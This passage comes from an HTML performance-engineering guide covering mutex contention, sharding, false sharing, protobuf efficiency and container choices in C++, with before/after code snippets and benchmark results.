  tasks[c].done.WaitForNotification();
}
for (int c = 0; c &lt; clusters-&gt;size(); c++) {
  RETURN_IF_ERROR(tasks[c].result);
}
</code></pre>

</details>

<p>The effect on system performance should be measured carefully – if spare CPU is
not available, or if memory bandwidth is saturated, parallelization may not
help, or may even hurt.</p>

<h3 id="amortize-lock-acquisition">Amortize lock acquisition</h3>

<p>Avoid fine-grained locking to reduce the cost of Mutex operations in hot paths.
Caveat: this should only be done if the change does not increase lock
contention.</p>

<details>
<summary><p>Acquire lock once to free entire tree of query nodes, rather
than reacquiring lock for every node in tree.</p>
</summary>

<p>mustang-query.cc</p>

<div>
<pre><code>// Pool of query nodes
ThreadSafeFreeList&lt;MustangQuery&gt; pool_(256);
...
void MustangQuery::Release(MustangQuery* node) {
  if (node == NULL)
    return;
  for (int i=0; i &lt; node-&gt;children_-&gt;size(); ++i)
    Release((*node-&gt;children_)[i]);
  node-&gt;children_-&gt;clear();
  pool_.Delete(node);
}
</code></pre>
</div>

<div>
<pre><code>// Pool of query nodes
Mutex pool_lock_;
FreeList&lt;MustangQuery&gt; pool_(256);
...
void MustangQuery::Release(MustangQuery* node) {
  if (node == NULL)
    return;
  MutexLock l(&amp;pool_lock_);
  ReleaseLocked(node);
}

void MustangQuery::ReleaseLocked(MustangQuery* node) {
#ifndef NDEBUG
  pool_lock_.AssertHeld();
#endif
  if (node == NULL)
    return;
  for (int i=0; i &lt; node-&gt;children_-&gt;size(); ++i)
    ReleaseLocked((*node-&gt;children_)[i]);
  node-&gt;children_-&gt;clear();
  pool_.Delete(node);
}
</code></pre>
</div>


</details>

<h3 id="keep-critical-sections-short">Keep critical sections short</h3>

<p>Avoid expensive work inside critical sections. In particular, watch out for
innocuous looking code that might be doing RPCs or accessing files.</p>

<details>
<summary><p>Reduce number of cache lines touched in critical section.</p>
</summary>

<p>Careful data structure adjustments reduce the number of cache lines accessed
significantly and improve the performance of an ML training run by 3.3%.</p>
<ol>
<li>Precompute some per-node type properties as bits within the NodeItem data
structure, meaning that we can avoid touching the Node* object for outgoing
edges in the critical section.</li>
<li>Change ExecutorState::ActivateNodes to use the NodeItem of the destination
node for each outgoing edge, rather than touching fields in the *item-&gt;node
object. Typically this means that we touch 1 or 2 cache lines total for
accessing the needed edge data, rather than <code>~2 + O(num_outgoing edges)</code>
(and for large graphs with many cores executing them there is also less TLB
pressure).</li>
</ol>

</details>

<details>
<summary><p>Avoid RPC while holding Mutex.</p>
</summary>

<p>trainer.cc</p>

<div>
<pre><code>{
  // Notify the parameter server that we are starting.
  MutexLock l(&amp;lock_);
  model_ = model;
  MaybeRecordProgress(last_global_step_);
}
</code></pre>
</div>

<div>
<pre><code>bool should_start_record_progress = false;
int64 step_for_progress = -1;
{
  // Notify the parameter server that we are starting.
  MutexLock l(&amp;lock_);
  model_ = model;
  should_start_record_progress = ShouldStartRecordProgress();
  step_for_progress = last_global_step_;
}
if (should_start_record_progress) {
  StartRecordProgress(step_for_progress);
}
</code></pre>
</div>


</details>

<p>Also, be wary of expensive destructors that will run before a Mutex is unlocked
(this can often happen when the Mutex unlock is triggered by a <code>~MutexUnlock</code>.)
Declaring objects with expensive destructors before MutexLock may help (assuming
it is thread-safe).</p>

<h3 id="reduce-contention-by-sharding">Reduce contention by sharding</h3>

<p>Sometimes a data structure protected by a Mutex that is exhibiting high
contention can be safely split into multiple shards, each shard with its own
Mutex. (Note: this requires that there are no cross-shard invariants between the
different shards.)</p>

<details>
<summary><p>Shard a cache 16 ways which improves throughput under a
multi-threaded load by ~2x.</p>
</summary>

<p>cache.cc</p>

<div>
<pre><code>class ShardedLRUCache : public Cache {
 private:
  LRUCache shard_[kNumShards];
  port::Mutex id_mutex_;
  uint64_t last_id_;

  static inline uint32_t HashSlice(const Slice&amp; s) {
    return Hash(s.data(), s.size(), 0);
  }

  static uint32_t Shard(uint32_t hash) {
    return hash &gt;&gt; (32 - kNumShardBits);
  }
  ...
  virtual Handle* Lookup(const Slice&amp; key) {
    const uint32_t hash = HashSlice(key);
    return shard_[Shard(hash)].Lookup(key, hash);
  }
</code></pre>
</div>


</details>

<details>
<summary><p>Shard spanner data structure for tracking calls.</p>
</summary>

<p>transaction_manager.cc</p>

<div>
<pre><code>absl::MutexLock l(&amp;active_calls_in_mu_);
ActiveCallMap::const_iterator iter = active_calls_in_.find(m-&gt;tid());
if (iter != active_calls_in_.end()) {
  iter-&gt;second.ExtractElements(&amp;m-&gt;tmp_calls_);
}
</code></pre>
</div>

<div>
<pre><code>ActiveCalls::LockedShard shard(active_calls_in_, m-&gt;tid());
const ActiveCallMap&amp; active_calls_map = shard.active_calls_map();
ActiveCallMap::const_iterator iter = active_calls_map.find(m-&gt;tid());
if (iter != active_calls_map.end()) {
  iter-&gt;second.ExtractElements(&amp;m-&gt;tmp_calls_);
}
</code></pre>
</div>


</details>

<p>If the data structure in question is a map, consider using a concurrent hash map
implementation instead.</p>

<p>Be careful with the information used for shard selection. If, for example, you
use some bits of a hash value for shard selection and then those same bits end
up being used again later, the latter use may perform poorly since it sees a
skewed distribution of hash values.</p>

<details>
<summary><p>Fix information used for shard selection to prevent hash
table issues.</p>
</summary>

<p>netmon_map_impl.h</p>

<div>
<pre><code>ConnectionBucket* GetBucket(Index index) {
  // Rehash the hash to make sure we are not partitioning the buckets based on
  // the original hash. If num_buckets_ is a power of 2 that would drop the
  // entropy of the buckets.
  size_t original_hash = absl::Hash&lt;Index&gt;()(index);
  int hash = absl::Hash&lt;size_t&gt;()(original_hash) % num_buckets_;
  return &amp;buckets_[hash];
}
</code></pre>
</div>

<div>
<pre><code>ConnectionBucket* GetBucket(Index index) {
  absl::Hash&lt;std::pair&lt;Index, size_t&gt;&gt; hasher{};
  // Combine the hash with 42 to prevent shard selection using the same bits
  // as the underlying hashtable.
  return &amp;buckets_[hasher({index, 42}) % num_buckets_];
}
</code></pre>
</div>


</details>

<details>
<summary><p>Shard Spanner data structure used for tracking calls.</p>
</summary>

<p>This CL partitions the ActiveCallMap into 64 shards. Each shard is protected by
a separate mutex. A given transaction will be mapped to exactly one shard. A new
interface LockedShard(tid) is added for accessing the ActiveCallMap for a
transaction in a thread-safe manner. Example usage:</p>
<p>transaction_manager.cc</p>

<div>
<pre><code>{
  absl::MutexLock l(&amp;active_calls_in_mu_);
  delayed_locks_timer_ring_.Add(delayed_locks_flush_time_ms, tid);
}
</code></pre>
</div>

<div>
<pre><code>{
  ActiveCalls::LockedShard shard(active_calls_in_, tid);
  shard.delayed_locks_timer_ring().Add(delayed_locks_flush_time_ms, tid);
}
</code></pre>
</div>

<p>The results show a 69% reduction in overall wall-clock time when running the
benchmark with 8192 fibers</p>
<pre><code>Benchmark                   Time(ns)        CPU(ns)     Iterations
------------------------------------------------------------------
BM_ActiveCalls/8k        11854633492     98766564676            10
BM_ActiveCalls/16k       26356203552    217325836709            10
</code></pre>
<pre><code>Benchmark                   Time(ns)        CPU(ns)     Iterations
------------------------------------------------------------------
BM_ActiveCalls/8k         3696794642     39670670110            10
BM_ActiveCalls/16k        7366284437     79435705713            10
</code></pre>

</details>

<h3 id="simd-instructions">SIMD Instructions</h3>

<p>Explore whether handling multiple items at once using
<a href="https://en.wikipedia.org/wiki/Single_instruction,_multiple_data">SIMD</a>
instructions available on modern CPUs can give speedups (e.g., see
<code>absl::flat_hash_map</code> discussion below in <a href="#bulk-operations">Bulk Operations</a>
section).</p>

<h3 id="reduce-false-sharing">Reduce false sharing</h3>

<p>If different threads access different mutable data, consider placing the
different data items on different cache lines, e.g., in C++ using the <code>alignas</code>
directive. However, these directives are easy to misuse and may increase object
sizes significantly, so make sure performance measurements justify their use.</p>

<details>
<summary><p>Segregate commonly mutated fields in a different cache
line than other fields.</p>
</summary>

<p>histogram.h</p>

<div>
<pre><code>HistogramOptions options_;
...
internal::HistogramBoundaries *boundaries_;
...
std::vector&lt;double&gt; buckets_;

double min_;             // Minimum.
double max_;             // Maximum.
double count_;           // Total count of occurrences.
double sum_;             // Sum of values.
double sum_of_squares_;  // Sum of squares of values.
...
RegisterVariableExporter *exporter_;
</code></pre>
</div>

<div>
<pre><code>  HistogramOptions options_;
  ...
  internal::HistogramBoundaries *boundaries_;
  ...
  RegisterVariableExporter *exporter_;
  ...
  // Place the following fields in a dedicated cacheline as they are frequently
  // mutated, so we can avoid potential false sharing.
  ...
#ifndef SWIG
  alignas(ABSL_CACHELINE_SIZE)
#endif
  std::vector&lt;double&gt; buckets_;

  double min_;             // Minimum.
  double max_;             // Maximum.
  double count_;           // Total count of occurrences.
  double sum_;             // Sum of values.
  double sum_of_squares_;  // Sum of squares of values.
</code></pre>
</div>


</details>

<h3 id="reduce-frequency-of-context-switches">Reduce frequency of context switches</h3>

<details>
<summary><p>Process small work items inline instead of on device
thread pool.</p>
</summary>

<p>cast_op.cc</p>

<div>
<pre><code>template &lt;typename Device, typename Tout, typename Tin&gt;
void CastMaybeInline(const Device&amp; d, typename TTypes&lt;Tout&gt;::Flat o,
                     typename TTypes&lt;Tin&gt;::ConstFlat i) {
  if (o.size() * (sizeof(Tin) + sizeof(Tout)) &lt; 16384) {
    // Small cast on a CPU: do inline
    o = i.template cast&lt;Tout&gt;();
  } else {
    o.device(d) = i.template cast&lt;Tout&gt;();
  }
}
</code></pre>
</div>


</details>

<h3 id="use-buffered-channels-for-pipelining">Use buffered channels for pipelining</h3>

<p>Channels can be unbuffered which means that a writer blocks until a reader is
ready to pick up an item. Unbuffered channels can be useful when the channel is
being used for synchronization, but not when the channel is being used to
increase parallelism.</p>

<h3 id="consider-lock-free-approaches">Consider lock-free approaches</h3>

<p>Sometimes lock-free data structures can make a difference over more conventional
mutex-protected data structures. However, direct atomic variable manipulation
can be <a href="https://abseil.io/docs/cpp/atomic_danger">dangerous</a>. Prefer higher-level abstractions.</p>

<details>
<summary><p>Use lock-free map to manage a cache of RPC channels.</p>
</summary>

<p>Entries in an RPC stub cache are read thousands of times a second and modified
rarely. Switching to an appropriate lock-free map reduces search latency by
3%-5%.</p>

</details>

<details>
<summary><p>Use a fixed lexicon+lock-free hash map to speed-up
determining IsValidTokenId.</p>
</summary>

<p>dynamic_token_class_manager.h</p>

<div>
<pre><code>mutable Mutex mutex_;

// The density of this hash map is guaranteed by the fact that the
// dynamic lexicon reuses previously allocated TokenIds before trying
// to allocate new ones.
dense_hash_map&lt;TokenId, common::LocalTokenClassId&gt; tid_to_cid_
    GUARDED_BY(mutex_);
</code></pre>
</div>

<div>
<pre><code>// Read accesses to this hash-map should be done using
// 'epoch_gc_'::(EnterFast / LeaveFast). The writers should periodically
// GC the deleted entries, by simply invoking LockFreeHashMap::CreateGC.
typedef util::gtl::LockFreeHashMap&lt;TokenId, common::LocalTokenClassId&gt;
    TokenIdTokenClassIdMap;
TokenIdTokenClassIdMap tid_to_cid_;
</code></pre>
</div>


</details>

<h2 id="protobuf-advice">Protocol Buffer advice</h2>

<p>Protobufs are a convenient representation of data, especially if the data will
be sent over the wire or stored persistently. However, they can have significant
performance costs. For example, a piece of code that fills in a list of 1000
points and then sums up the Y coordinates, speeds up by a <strong>factor of 20</strong> when
converted from protobufs to a C++ std::vector of structs!</p>

<details>
<summary><p>Benchmark code for both versions.</p>
</summary>

<pre><code>name                old time/op  new time/op  delta
BenchmarkIteration  17.4µs ± 5%   0.8µs ± 1%  -95.30%  (p=0.000 n=11+12)
</code></pre>
<p>Protobuf version:</p>
<pre><code>message PointProto {
  int32 x = 1;
  int32 y = 2;
}
message PointListProto {
  repeated PointProto points = 1;
}
</code></pre>
<pre><code>void SumProto(const PointListProto&amp; vec) {
  int sum = 0;
  for (const PointProto&amp; p : vec.points()) {
    sum += p.y();
  }
  ABSL_VLOG(1) &lt;&lt; sum;
}

void BenchmarkIteration() {
  PointListProto points;
  points.mutable_points()-&gt;Reserve(1000);
  for (int i = 0; i &lt; 1000; i++) {
    PointProto* p = points.add_points();
    p-&gt;set_x(i);
    p-&gt;set_y(i * 2);
  }
  SumProto(points);
}
</code></pre>
<p>Non-protobuf version:</p>
<pre><code>struct PointStruct {
  int x;
  int y;
};

void SumVector(const std::vector&lt;PointStruct&gt;&amp; vec) {
  int sum = 0;
  for (const PointStruct&amp; p : vec) {
    sum += p.y;
  }
  ABSL_VLOG(1) &lt;&lt; sum;
}

void BenchmarkIteration() {
  std::vector&lt;PointStruct&gt; points;
  points.reserve(1000);
  for (int i = 0; i &lt; 1000; i++) {
    points.push_back({i, i * 2});
  }
  SumVector(points);
}
</code></pre>

</details>

<p>In addition, the protobuf version adds a few kilobytes of code and data to the
binary, which may not seem like much, but adds up quickly in systems with many
protobuf types. This increased size creates performance problems by creating
i-cache and d-cache pressure.</p>

<p>Here are some tips related to protobuf performance:</p>

<details>
<summary><p>Do not use protobufs unnecessarily.</p>
</summary>

<p>Given the factor of 20 performance difference described above, if some data is
never serialized or parsed, you probably should not put it in a protocol buffer.
The purpose of protocol buffers is to make it easy to serialize and deserialize
data structures, but they can have significant code-size, memory, and CPU
overheads. Do not use them if all you want are some of the other niceties like
<code>DebugString</code> and copyability.</p>

</details>

<details>
<summary><p>Avoid unnecessary message hierarchies.</p>
</summary>

<p>Message hierarchy can be useful to organize information in a more readable
fashion. However, the extra level of message hierarchy incurs overheads like
memory allocations, function calls, cache misses, larger serialized messages,
etc.</p>
<p>E.g., instead of:</p>
<pre><code>message Foo {
  optional Bar bar = 1;
}
message Bar {
  optional Baz baz = 1;
}
message Baz {
  optional int32 count = 1;
}
</code></pre>
<p>Prefer:</p>
<pre><code>message Foo {
  optional int32 count = 1;
}
</code></pre>
<p>A protocol buffer message corresponds to a message class in C++ generated code
and emits a tag and the length of the payload on the wire. To carry an integer,
the old form requires more allocations (and deallocations) and emits a larger
amount of generated code. As a result, all protocol buffer operations (parsing,
serialization, size, etc.) become more expensive, having to traverse the message
tree. The new form does not have such overhead and is more efficient.</p>

</details>

<details>
<summary><p>Use small field numbers for frequently occurring fields.</p>
</summary>

<p>Protobufs use a variable length integer representation for the combination of
field number and wire format (see the
<a href="https://protobuf.dev/programming-guides/encoding/">protobuf encoding documentation</a>).
This representation is 1 byte for field numbers between 1 and 15, and two bytes
for field numbers between 16 and 2047. (Field numbers 2048 or greater should
typically be avoided.)</p>
<p>Consider pre-reserving some small field numbers for future extension of
performance-sensitive protobufs.</p>

</details>

<details>
<summary><p>Choose carefully between int32, sint32, fixed32, and uint32 (and
similarly for the 64 bit variants).</p>
</summary>

<p>Generally, use <code>int32</code> or <code>int64</code>, but use <code>fixed32</code> or <code>fixed64</code> for large
values like hash codes and <code>sint32</code> or <code>sint64</code> for values are that are often
negative.</p>
<p>A varint occupies fewer bytes to encode small integers and can save space at the
cost of more expensive decoding. However, it can take up more space for negative
or large values. In that case, using fixed32 or fixed64 (instead of uint32 or
uint64) reduces size with much cheaper encoding and decoding. For small negative
integers, use sint32 or sint64 instead of int32 or int64.d</p>

</details>

<details>
<summary><p>For proto2, pack repeated numeric fields by annotating them with
<code>[packed=true]</code>.</p>
</summary>

<p>In proto2, repeated values are serialized as a sequence of (tag, value) pairs by
default. This is inefficient because tags have to be decoded for every element.</p>
<p>Packed repeated primitives are serialized with the length of the payload first
followed by values without tags. When using fixed-width values, we can avoid
reallocations by knowing the final size the moment we start parsing; i.e., no
reallocation cost. We still don't know how many varints are in the payload and
may have to pay the reallocation cost.</p>
<p>In proto3, repeated fields are packed by default.</p>
<p>Packed works best with fixed-width values like fixed32, fixed64, float, double,
etc. since the entire encoded length can be predetermined by multiplying the
number of elements by the fixed value size, instead of having to calculate the
length of each individual element.</p>

</details>

<details>
<summary><p>Use <code>bytes</code> instead for <code>string</code> for binary data
and large values.</p>
</summary>

<p>The <code>string</code> type holds UTF8-encoded text, and can sometimes require validation.
The <code>bytes</code> type can hold an arbitrary sequence of bytes (non-text data) and is
often more appropriate as well as more efficient than <code>string</code>.</p>

</details>

<details>
<summary><p>Consider <code>string_type = VIEW</code> to avoid copying.</p>
</summary>

<p>Copying a big string or bytes field during parsing is expensive. Such cost can
often be avoided by marking the field with <code>string_type = VIEW</code>.</p>
<pre><code>message Image {
  ...
  bytes jpeg_encoding = 4 [features.(pb.cpp).string_type=VIEW];
}
</code></pre>
<p>Without the <code>VIEW</code> annotation, when the protocol buffer is parsed, the
potentially large field contents are copied from the serialized protocol buffer
to a string object in memory. Depending on the number of string or bytes fields
and the size of those fields, the overhead of copying can be significant.</p>
<p>Instead of copying the big binary blobs, routines like
<code>ParseFromStringWithAliasing</code> use <code>absl::string_view</code> to reference the original
backing string. Note that the backing string (the serialized protocol buffer)
must outlive the protocol buffer instance that contains the alias.</p>

</details>

<details>
<summary><p>Consider using <code>Cord</code> for large fields to reduce copying
costs.</p>
</summary>

<p>Annotating large <code>bytes</code> and <code>string</code> fields with <code>[ctype=CORD]</code> may reduce
copying costs. This annotation changes the representation of the field from
<code>std::string</code> to <code>absl::Cord</code>. <code>absl::Cord</code> uses reference counting and
tree-based storage to reduce copying and appending costs. If a protocol buffer
is serialized to a cord, parsing a string or bytes field with <code>[ctype=CORD]</code> can
avoid copying the field contents.</p>
<pre><code>message Document {
  ...
  bytes html = 4 [ctype = CORD];
}
</code></pre>
<p>Performance of a Cord field depends on length distribution and access patterns.
Use benchmarks to validate such changes.</p>

</details>

<details>
<summary><p>Use protobuf arenas in C++ code.</p>
</summary>

<p>Consider using arenas to save allocation and deallocation costs, especially for
protobufs containing repeated, string, or message fields.</p>
<p>Message and string fields are heap-allocated (even if the top-level protocol
buffer object is stack-allocated). If a protocol buffer message has a lot of sub
message fields and string fields, allocation and deallocation cost can be
significant. Arenas amortize allocation costs and makes deallocation virtually
free. It also improves memory locality by allocating from contiguous chunks of
memory.</p>

</details>

<details>
<summary><p>Keep .proto files small</p>
</summary>

<p>Do not put too many messages in a single .proto file. Once you rely on anything
at all from a .proto file, the entire file will get pulled in by the linker even
if it's mostly unused. This increases build times and binary sizes. You can use
extensions and <code>Any</code> to avoid creating hard dependencies on big
.proto files with many message types.</p>

</details>

<details>
<summary><p>Consider storing protocol buffers in serialized form, even in memory.</p>
</summary>

<p>In-memory protobuf objects have a large memory footprint (often 5x the wire
format size), potentially spread across many cache lines. So if your application
is going to keep many protobuf objects live for long periods of time, consider
storing them in serialized form.</p>

</details>

<details>
<summary><p>Avoid protobuf map fields.</p>
</summary>

<p>Protobuf map fields have performance problems that usually outweigh the small
syntactic convenience they provide. Prefer using non-protobuf maps initialized
from protobuf contents:</p>
<p>msg.proto</p>
<pre><code>map&lt;string, bytes&gt; env_variables = 5;
</code></pre>
<pre><code>message Var {
  string key = 1;
  bytes value = 2;
}
repeated Var env_variables = 5;
</code></pre>

</details>

<details>
<summary><p>Use protobuf message definition with a subset of the fields.</p>
</summary>

<p>If you want to access only a few fields of a large message type, consider
defining your own protocol buffer message type that mimics the original type,
but only defines the fields that you care about. Here's an example:</p>
<pre><code>message FullMessage {
  optional int32 field1 = 1;
  optional BigMessage field2 = 2;
  optional int32 field3 = 3;
  repeater AnotherBigMessage field4 = 4;
  ...
  optional int32 field100 = 100;
}
</code></pre>
<pre><code>message SubsetMessage {
  optional int32 field3 = 3;
  optional int32 field88 = 88;
}
</code></pre>
<p>By parsing a serialized <code>FullMessage</code> into a <code>SubsetMessage</code>, only two out of a
hundred fields are parsed and others are treated as unknown fields. Consider
using APIs that discard unknown fields to improve performance even more when
appropriate.</p>

</details>

<details>
<summary><p>Reuse protobuf objects when possible.</p>
</summary>

<p>Declare protobuf objects outside loops so that their allocated storage can be
reused across loop iterations.</p>

</details>

<!-- TODO: Flesh out the preceding examples, maybe with benchmarks. -->

<h2 id="c-specific-advice">C++-Specific advice</h2>

<h3 id="abslflat_hash_map-and-set">absl::flat_hash_map (and set)</h3>

<p><a href="https://abseil.io/docs/cpp/guides/container">Absl hash tables</a> usually
out-perform C++ standard library containers such as <code>std::map</code> and
<code>std::unordered_map</code>.</p>

<details>
<summary><p>Speed up LanguageFromCode (use absl::flat_hash_map
instead of a __gnu_cxx::hash_map).</p>
</summary>

<p>languages.cc</p>

<div>
<pre><code>class CodeToLanguage
    ...
    : public __gnu_cxx::hash_map&lt;absl::string_view, i18n::languages::Language,
                                 CodeHash, CodeCompare&gt; {
</code></pre>
</div>

<div>
<pre><code>class CodeToLanguage
    ...
    : public absl::flat_hash_map&lt;absl::string_view, i18n::languages::Language,
                                 CodeHash, CodeCompare&gt; {
</code></pre>
</div>

<p>Benchmark results:</p>
<pre><code>name               old time/op  new time/op  delta
BM_CodeToLanguage  19.4ns ± 1%  10.2ns ± 3%  -47.47%  (p=0.000 n=8+10)
</code></pre>

</details>

<details>
<summary><p>Speed up stats publish/unpublish (an older change, so
uses dense_hash_map instead of absl::flat_hash_map, which did not exist at the
time).</p>
</summary>

<p>publish.cc</p>

<div>
<pre><code>typedef hash_map&lt;uint64, Publication*&gt; PublicationMap;
static PublicationMap* publications = NULL;
</code></pre>
</div>

<div>
<pre><code>typedef dense_hash_map&lt;uint64, Publication*&gt; PublicationMap;;
static PublicationMap* publications GUARDED_BY(mu) = NULL;
</code></pre>
</div>


</details>

<details>
<summary><p>Use dense_hash_map instead of hash_map for keeping track of
SelectServer alarms (would use absl::flat_hash_map today).</p>
</summary>

<p>alarmer.h</p>

<div>
<pre><code>typedef hash_map&lt;int, Alarm*&gt; AlarmList;
</code></pre>
</div>

<div>
<pre><code>typedef dense_hash_map&lt;int, Alarm*&gt; AlarmList;
</code></pre>
</div>


</details>

<h3 id="abslbtree_mapabslbtree_set">absl::btree_map/absl::btree_set</h3>

<p>absl::btree_map and absl::btree_set store multiple entries per tree node. This
has a number of advantages over ordered C++ standard library containers such as
<code>std::map</code>. First, the pointer overhead of pointing to child tree nodes is often
significantly reduced. Second, because the entries or key/values are stored
consecutively in memory for a given btree tree node, cache efficiency is often
significantly better.</p>

<details>
<summary><p>Use btree_set instead of std::set to represent a very heavily used
work-queue.</p>
</summary>

<p>register_allocator.h</p>
<pre><code>using container_type = std::set&lt;WorklistItem&gt;;
</code></pre>
<pre><code>using container_type = absl::btree_set&lt;WorklistItem&gt;;
</code></pre>

</details>

<h3 id="utilbitmapinlinedbitvector">util::bitmap::InlinedBitVector</h3>

<p><code>util::bitmap::InlinedBitvector</code> can store short bit-vectors inline, and
therefore can often be a better choice than <code>std::vector&lt;bool&gt;</code> or other bitmap
types.</p>

<details>
<summary><p>Use InlinedBitVector instead of std::vector&lt;bool&gt;, and
then use FindNextBitSet to find the next item of interest.</p>
</summary>

<p>block_encoder.cc</p>

<div>
<pre><code>vector&lt;bool&gt; live_reads(nreads);
...
for (int offset = 0; offset &lt; b_.block_width(); offset++) {
  ...
  for (int r = 0; r &lt; nreads; r++) {
    if (live_reads[r]) {
</code></pre>
</div>

<div>
<pre><code>util::bitmap::InlinedBitVector&lt;4096&gt; live_reads(nreads);
...
for (int offset = 0; offset &lt; b_.block_width(); offset++) {
  ...
  for (size_t r = 0; live_reads.FindNextSetBit(&amp;r); r++) {
    DCHECK(live_reads[r]);
</code></pre>
</div>


</details>

<h3 id="abslinlinedvector">absl::InlinedVector</h3>

<p>absl::InlinedVector stores a small number of elements inline (configurable via
the second template argument). This enables small vectors up to this number of
elements to generally have better cache efficiency and also to avoid allocating
a backing store array at all when the number of elements is small.</p>

<details>
<summary><p>Use InlinedVector instead of std::vector in various places.</p>
</summary>

<p>bundle.h</p>
<pre><code>class Bundle {
 public:
 ...
 private:
  // Sequence of (slotted instruction, unslotted immediate operands).
  std::vector&lt;InstructionRecord&gt; instructions_;
  ...
};
</code></pre>
<pre><code>class Bundle {
 public:
 ...
 private:
  // Sequence of (slotted instruction, unslotted immediate operands).
  absl::InlinedVector&lt;InstructionRecord, 2&gt; instructions_;
  ...
};
</code></pre>

</details>

<h3 id="gtlvector32">gtl::vector32</h3>

<p>Saves space by using a customized vector type that only supports sizes that fit
in 32 bits.</p>

<details>
<summary><p>Simple type change saves ~8TiB of memory in Spanner.</p>
</summary>

<p>table_ply.h</p>

<div>
<pre><code>class TablePly {
    ...
    // Returns the set of data columns stored in this file for this table.
    const std::vector&lt;FamilyId&gt;&amp; modified_data_columns() const {
      return modified_data_columns_;
    }
    ...
   private:
    ...
    std::vector&lt;FamilyId&gt; modified_data_columns_;  // Data columns in the table.
</code></pre>
</div>

<div>
<pre><code>#include "util/gtl/vector32.h"
    ...
    // Returns the set of data columns stored in this file for this table.
    absl::Span&lt;const FamilyId&gt; modified_data_columns() const {
      return modified_data_columns_;
    }
    ...

    ...
    // Data columns in the table.
    gtl::vector32&lt;FamilyId&gt; modified_data_columns_;
</code></pre>
</div>


</details>

<h3 id="gtlsmall_map">gtl::small_map</h3>

<p>gtl::small_map uses an inline array to store up to a certain number of unique
key-value-pair elements, but upgrades itself automatically to be backed by a
user-specified map type when it runs out of space.</p>

<details>
<summary><p>Use gtl::small_map in tflite_model.</p>
</summary>

<p>tflite_model.cc</p>

<div>
<pre><code>using ChoiceIdToContextMap = gtl::flat_hash_map&lt;int, TFLiteContext*&gt;;
</code></pre>
</div>

<div>
<pre><code>using ChoiceIdToContextMap =
    gtl::small_map&lt;gtl::flat_hash_map&lt;int, TFLiteContext*&gt;&gt;;
</code></pre>
</div>


</details>

<h3 id="gtlsmall_ordered_set">gtl::small_ordered_set</h3>

<p>gtl::small_ordered_set is an optimization for associative containers (such as
std::set or absl::btree_multiset). It uses a fixed array to store a certain
number of elements, then reverts to using a set or multiset when it runs out of
space. For sets that are typically small, this can be considerably faster than
using something like set directly, as set is optimized for large data sets. This
change shrinks cache footprint and reduces critical section length.</p>

<details>
<summary><p>Use gtl::small_ordered_set to hold set of listeners.</p>
</summary>

<p>broadcast_stream.h</p>

<div>
<pre><code>class BroadcastStream : public ParsedRtpTransport {
 ...
 private:
  ...
  std::set&lt;ParsedRtpTransport*&gt; listeners_ ABSL_GUARDED_BY(listeners_mutex_);
};
</code></pre>
</div>

<div>
<pre><code>class BroadcastStream : public ParsedRtpTransport {
 ...
 private:
  ...
  using ListenersSet =
      gtl::small_ordered_set&lt;std::set&lt;ParsedRtpTransport*&gt;, 10&gt;;
  ListenersSet listeners_ ABSL_GUARDED_BY(listeners_mutex_);
</code></pre>
</div>


</details>

<h3 id="gtl-intrusive_list">gtl::intrusive_list</h3>

<p><code>gtl::intrusive_list&lt;T&gt;</code> is a doubly-linked list where the link pointers are
embedded in the elements of type T. It saves one cache line+indirection per
element when compared to <code>std::list&lt;T*&gt;</code>.</p>

<details>
<summary><p>Use intrusive_list to keep track of inflight requests for
each index row update.</p>
</summary>

<p>row-update-sender-inflight-set.h</p>

<div>
<pre><code>std::set&lt;int64&gt; inflight_requests_ GUARDED_BY(mu_);
</code></pre>
</div>

<div>
<pre><code>class SeqNum : public gtl::intrusive_link&lt;SeqNum&gt; {
  ...
  int64 val_ = -1;
  ...
};
...
gtl::intrusive_list&lt;SeqNum&gt; inflight_requests_ GUARDED_BY(mu_);
</code></pre>
</div>


</details>

<h3 id="limit-abslstatus-and-abslstatusor-usage">Limit absl::Status and absl::StatusOr usage</h3>

<p>Even though <code>absl::Status</code> and <code>absl::StatusOr</code> types are fairly efficient, they
have a non-zero overhead even in the success path and should therefore be
avoided for hot routines that don’t need to return any meaningful error details
(or perhaps never even fail!):</p>

<details>
<summary><p>Avoid StatusOr&lt;int64&gt; return type for
RoundUpToAlignment() function.</p>
</summary>

<p>best_fit_allocator.cc</p>

<div>
<pre><code>absl::StatusOr&lt;int64&gt; BestFitAllocator::RoundUpToAlignment(int64 bytes) const {
  TPU_RET_CHECK_GE(bytes, 0);

  const int64 max_aligned = MathUtil::RoundDownTo&lt;int64&gt;(
      std::numeric_limits&lt;int64&gt;::max(), alignment_in_bytes_);
  if (bytes &gt; max_aligned) {
    return util::ResourceExhaustedErrorBuilder(ABSL_LOC)
           &lt;&lt; "Attempted to allocate "
           &lt;&lt; strings::HumanReadableNumBytes::ToString(bytes)
           &lt;&lt; " which after aligning to "
           &lt;&lt; strings::HumanReadableNumBytes::ToString(alignment_in_bytes_)
           &lt;&lt; " cannot be expressed as an int64.";
  }

  return MathUtil::RoundUpTo&lt;int64&gt;(bytes, alignment_in_bytes_);
}
</code></pre>
</div>

<p>best_fit_allocator.h</p>

<div>
<pre><code>// Rounds bytes up to nearest multiple of alignment_.
// REQUIRES: bytes &gt;= 0.
// REQUIRES: result does not overflow int64.
// REQUIRES: alignment_in_bytes_ is a power of 2 (checked in constructor).
int64 RoundUpToAlignment(int64 bytes) const {
  DCHECK_GE(bytes, 0);
  DCHECK_LE(bytes, max_aligned_bytes_);
  int64 result =
      ((bytes + (alignment_in_bytes_ - 1)) &amp; ~(alignment_in_bytes_ - 1));
  DCHECK_EQ(result, MathUtil::RoundUpTo&lt;int64&gt;(bytes, alignment_in_bytes_));
  return result;
}
</code></pre>
</div>


</details>

<details>
<summary><p>Add ShapeUtil::ForEachIndexNoStatus to avoid creating a
Status return object for every element of a tensor.</p>
</summary>

<p>shape_util.h</p>

<div>
<pre><code>using ForEachVisitorFunction =
    absl::FunctionRef&lt;StatusOr&lt;bool&gt;(absl::Span&lt;const int64_t&gt;)&gt;;
    ...
static void ForEachIndex(const Shape&amp; shape, absl::Span&lt;const int64_t&gt; base,
                         absl::Span&lt;const int64_t&gt; count,
                         absl::Span&lt;const int64_t&gt; incr,
                         const ForEachVisitorFunction&amp; visitor_function);

</code></pre>
</div>

<div>
<pre><code>using ForEachVisitorFunctionNoStatus =
    absl::FunctionRef&lt;bool(absl::Span&lt;const int64_t&gt;)&gt;;
    ...
static void ForEachIndexNoStatus(
    const Shape&amp; shape, absl::Span&lt;const int64_t&gt; base,
    absl::Span&lt;const int64_t&gt; count, absl::Span&lt;const int64_t&gt; incr,
    const ForEachVisitorFunctionNoStatus&amp; visitor_function);
</code></pre>
</div>

